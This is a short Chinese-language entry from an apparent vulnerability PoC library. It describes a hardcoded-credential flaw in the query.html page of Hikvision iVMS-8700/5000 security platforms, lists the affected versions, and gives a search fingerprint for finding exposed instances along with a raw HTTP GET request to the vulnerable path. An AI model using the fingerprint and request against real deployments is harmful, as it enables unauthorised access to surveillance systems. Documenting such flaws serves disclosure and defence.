---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# 海康威视iVMS-8700综合安防管理平台 query存在硬编码漏洞

# 一、漏洞简介
  海康威视iVMS集中监控应用管理平台，是以安全防范业务应用为导向，以视频图像应用为基础手段，综合视频监控、联网报警、智能分析、运维管理等多种安全防范应用系统，构建的多业务应用综合管理平台。海康威视iVMS-8700综合安防管理平台 query存在硬编码漏洞。

# 二、影响版本
+ 海康威视综合安防系统iVMS-5000
+ 海康威视综合安防系统 iVMS-8700

# 三、资产测绘
+ hunter：`web.body="/views/home/file/installPackage.rar"`


+ 登录页面：


# 四、漏洞复现
```java
GET /gisplatform/hikgis/query.html HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zv2apf24gb0ynffw>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
